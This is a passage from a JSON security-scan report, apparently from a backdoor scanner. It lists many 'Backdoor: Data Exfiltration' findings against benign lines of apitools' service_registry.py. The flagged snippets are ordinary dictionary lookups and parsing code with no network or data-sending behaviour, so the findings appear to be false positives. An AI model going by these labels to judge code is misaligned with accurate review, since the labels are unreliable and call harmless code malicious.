              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 42,
                  "endLine": 458,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n            # NOTE: According to the discovery document, if the request or\n            # response is present, it will simply contain a `$ref`.\n            body_type = method_description.get('request')\n            if body_type is None:\n                request_type = None\n            else:\n",
                    "rendered": {
                      "text": "\n            # NOTE: According to the discovery document, if the request or\n            # response is present, it will simply contain a `$ref`.\n            body_type = method_description.get('request')\n            if body_type is None:\n                request_type = None\n            else:\n",
                      "markdown": "`\n            # NOTE: According to the discovery document, if the request or\n            # response is present, it will simply contain a `$ref`.\n            body_type = method_description.get('request')\n            if body_type is None:\n                request_type = None\n            else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 450,
                  "startColumn": 37,
                  "endLine": 450,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n        items = sorted(method_descriptions.items())\n        for method_name, method_description in items:\n",
                    "rendered": {
                      "text": "    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n        items = sorted(method_descriptions.items())\n        for method_name, method_description in items:\n",
                      "markdown": "`    def AddServiceFromResource(self, service_name, methods):\n        \"\"\"Add a new service named service_name with the given methods.\"\"\"\n        service_name = self.__names.CleanName(service_name)\n        method_descriptions = methods.get('methods', {})\n        method_info_map = collections.OrderedDict()\n        items = sorted(method_descriptions.items())\n        for method_name, method_description in items:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 51,
                  "endLine": 442,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n        return body_field_name\n",
                    "rendered": {
                      "text": "                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n        return body_field_name\n",
                      "markdown": "`                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n        # means it's bound to happen at some point.\n        while body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_body' % body_field_name)\n        return body_field_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 48,
                  "endLine": 437,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n        body_field_name = self.__BodyFieldName(body_type)\n        if body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n",
                    "rendered": {
                      "text": "    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n        body_field_name = self.__BodyFieldName(body_type)\n        if body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n",
                      "markdown": "`    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n        body_field_name = self.__BodyFieldName(body_type)\n        if body_field_name in method_description.get('parameters', {}):\n            body_field_name = self.__names.FieldName(\n                '%s_resource' % body_field_name)\n        # It's exceedingly unlikely that we'd get two name collisions, which\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 432,
                  "startColumn": 47,
                  "endLine": 432,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        return self.__names.FieldName(body_type['$ref'])\n\n    def __GetRequestType(self, body_type):\n        return self.__names.ClassName(body_type.get('$ref'))\n\n    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n",
                    "rendered": {
                      "text": "        return self.__names.FieldName(body_type['$ref'])\n\n    def __GetRequestType(self, body_type):\n        return self.__names.ClassName(body_type.get('$ref'))\n\n    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n",
                      "markdown": "`        return self.__names.FieldName(body_type['$ref'])\n\n    def __GetRequestType(self, body_type):\n        return self.__names.ClassName(body_type.get('$ref'))\n\n    def __GetRequestField(self, method_description, body_type):\n        \"\"\"Determine the request field for this method.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 411,
                  "startColumn": 45,
                  "endLine": 411,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n            if location == 'query':\n",
                    "rendered": {
                      "text": "        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n            if location == 'query':\n",
                      "markdown": "`        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n            if location == 'query':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 51,
                  "endLine": 410,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n",
                    "rendered": {
                      "text": "                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n",
                      "markdown": "`                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n            param = self.__names.CleanName(param)\n            location = desc['location']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 408,
                  "startColumn": 58,
                  "endLine": 408,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n",
                    "rendered": {
                      "text": "        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n",
                      "markdown": "`        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n        for param, desc in method_description.get('parameters', {}).items():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 34,
                  "endLine": 407,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n",
                    "rendered": {
                      "text": "                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n",
                      "markdown": "`                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n            'supportsMediaDownload', False)\n        self.__all_scopes.update(method_description.get('scopes', ()))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 405,
                  "startColumn": 29,
                  "endLine": 405,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                self.__client_info.base_path + flat_path)\n            if flat_path != relative_path:\n                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n",
                    "rendered": {
                      "text": "                self.__client_info.base_path + flat_path)\n            if flat_path != relative_path:\n                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n",
                      "markdown": "`                self.__client_info.base_path + flat_path)\n            if flat_path != relative_path:\n                method_info.flat_path = flat_path\n        if method_description.get('supportsMediaUpload', False):\n            method_info.upload_config = self.__ComputeUploadConfig(\n                method_description.get('mediaUpload'), method_id)\n        method_info.supports_download = method_description.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 399,
                  "startColumn": 38,
                  "endLine": 399,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            response_type_name=self.__names.ClassName(response),\n            request_field=request_field,\n        )\n        flat_path = method_description.get('flatPath', None)\n        if flat_path is not None:\n            flat_path = self.__names.NormalizeRelativePath(\n                self.__client_info.base_path + flat_path)\n",
                    "rendered": {
                      "text": "            response_type_name=self.__names.ClassName(response),\n            request_field=request_field,\n        )\n        flat_path = method_description.get('flatPath', None)\n        if flat_path is not None:\n            flat_path = self.__names.NormalizeRelativePath(\n                self.__client_info.base_path + flat_path)\n",
                      "markdown": "`            response_type_name=self.__names.ClassName(response),\n            request_field=request_field,\n        )\n        flat_path = method_description.get('flatPath', None)\n        if flat_path is not None:\n            flat_path = self.__names.NormalizeRelativePath(\n                self.__client_info.base_path + flat_path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 34,
                  "endLine": 391,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            method_id=method_id,\n            http_method=method_description['httpMethod'],\n            description=util.CleanDescription(\n                method_description.get('description', '')),\n            query_params=[],\n            path_params=[],\n            ordered_params=ordered_params,\n",
                    "rendered": {
                      "text": "            method_id=method_id,\n            http_method=method_description['httpMethod'],\n            description=util.CleanDescription(\n                method_description.get('description', '')),\n            query_params=[],\n            path_params=[],\n            ordered_params=ordered_params,\n",
                      "markdown": "`            method_id=method_id,\n            http_method=method_description['httpMethod'],\n            description=util.CleanDescription(\n                method_description.get('description', '')),\n            query_params=[],\n            path_params=[],\n            ordered_params=ordered_params,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 384,
                  "startColumn": 25,
                  "endLine": 384,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n        method_info = base_api.ApiMethodInfo(\n            relative_path=relative_path,\n",
                    "rendered": {
                      "text": "        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n        method_info = base_api.ApiMethodInfo(\n            relative_path=relative_path,\n",
                      "markdown": "`        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n        method_info = base_api.ApiMethodInfo(\n            relative_path=relative_path,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 382,
                  "startColumn": 44,
                  "endLine": 382,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                     method_description['path'])))\n        method_id = method_description['id']\n        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n",
                    "rendered": {
                      "text": "                     method_description['path'])))\n        method_id = method_description['id']\n        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n",
                      "markdown": "`                     method_description['path'])))\n        method_id = method_description['id']\n        ordered_params = []\n        for param_name in method_description.get('parameterOrder', []):\n            param_info = method_description['parameters'][param_name]\n            if param_info.get('required', False):\n                ordered_params.append(param_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 368,
                  "startColumn": 29,
                  "endLine": 368,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n                if attr in media:\n                    setattr(config, '%s_%s' % (protocol, attr), media[attr])\n",
                    "rendered": {
                      "text": "                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n                if attr in media:\n                    setattr(config, '%s_%s' % (protocol, attr), media[attr])\n",
                      "markdown": "`                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n                if attr in media:\n                    setattr(config, '%s_%s' % (protocol, attr), media[attr])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 366,
                  "startColumn": 39,
                  "endLine": 366,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n",
                    "rendered": {
                      "text": "        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n",
                      "markdown": "`        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n                logging.warning('Unexpected MIME type: %s', accept_pattern)\n        protocols = media_upload_config.get('protocols', {})\n        for protocol in ('simple', 'resumable'):\n            media = protocols.get(protocol, {})\n            for attr in ('multipart', 'path'):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 47,
                  "endLine": 361,
                  "endColumn": 52,
                  "snippet": {
                    "text": "                'No accept types found for upload configuration in '\n                'method %s, using */*', method_id)\n        config.accept.extend([\n            str(a) for a in media_upload_config.get('accept', '*/*')])\n\n        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n",
                    "rendered": {
                      "text": "                'No accept types found for upload configuration in '\n                'method %s, using */*', method_id)\n        config.accept.extend([\n            str(a) for a in media_upload_config.get('accept', '*/*')])\n\n        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n",
                      "markdown": "`                'No accept types found for upload configuration in '\n                'method %s, using */*', method_id)\n        config.accept.extend([\n            str(a) for a in media_upload_config.get('accept', '*/*')])\n\n        for accept_pattern in config.accept:\n            if not _MIME_PATTERN_RE.match(accept_pattern):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 345,
                  "startColumn": 29,
                  "endLine": 345,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        shift = 0\n        if unit is not None:\n            unit_dict = {'KB': 10, 'MB': 20, 'GB': 30, 'TB': 40}\n            shift = unit_dict.get(unit.upper())\n            if shift is None:\n                raise ValueError('Unknown unit %s' % unit)\n        return int(size) * (1 << shift)\n",
                    "rendered": {
                      "text": "        shift = 0\n        if unit is not None:\n            unit_dict = {'KB': 10, 'MB': 20, 'GB': 30, 'TB': 40}\n            shift = unit_dict.get(unit.upper())\n            if shift is None:\n                raise ValueError('Unknown unit %s' % unit)\n        return int(size) * (1 << shift)\n",
                      "markdown": "`        shift = 0\n        if unit is not None:\n            unit_dict = {'KB': 10, 'MB': 20, 'GB': 30, 'TB': 40}\n            shift = unit_dict.get(unit.upper())\n            if shift is None:\n                raise ValueError('Unknown unit %s' % unit)\n        return int(size) * (1 << shift)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 329,
                  "startColumn": 26,
                  "endLine": 329,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n                break\n        else:\n",
                    "rendered": {
                      "text": "        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n                break\n        else:\n",
                      "markdown": "`        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n                break\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 327,
                  "startColumn": 39,
                  "endLine": 327,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        if message is None:\n            return True\n        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n",
                    "rendered": {
                      "text": "        if message is None:\n            return True\n        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n",
                      "markdown": "`        if message is None:\n            return True\n        field_names = [x.name for x in message.fields]\n        parameters = method_description.get('parameters', {})\n        for param_name, param_info in parameters.items():\n            if (param_info.get('location') != 'path' or\n                    self.__names.CleanName(param_name) not in field_names):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 320,
                  "startColumn": 38,
                  "endLine": 320,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        \"\"\"Determine if this method needs a new request type created.\"\"\"\n        if not request_type:\n            return True\n        method_id = method_description.get('id', '')\n        if method_id in self.__unelidable_request_methods:\n            return True\n        message = self.__message_registry.LookupDescriptorOrDie(request_type)\n",
                    "rendered": {
                      "text": "        \"\"\"Determine if this method needs a new request type created.\"\"\"\n        if not request_type:\n            return True\n        method_id = method_description.get('id', '')\n        if method_id in self.__unelidable_request_methods:\n            return True\n        message = self.__message_registry.LookupDescriptorOrDie(request_type)\n",
                      "markdown": "`        \"\"\"Determine if this method needs a new request type created.\"\"\"\n        if not request_type:\n            return True\n        method_id = method_description.get('id', '')\n        if method_id in self.__unelidable_request_methods:\n            return True\n        message = self.__message_registry.LookupDescriptorOrDie(request_type)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/service_registry.py"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 56,
                  "endLine": 281,
                  "endColumn": 61,
                  "snippet": {
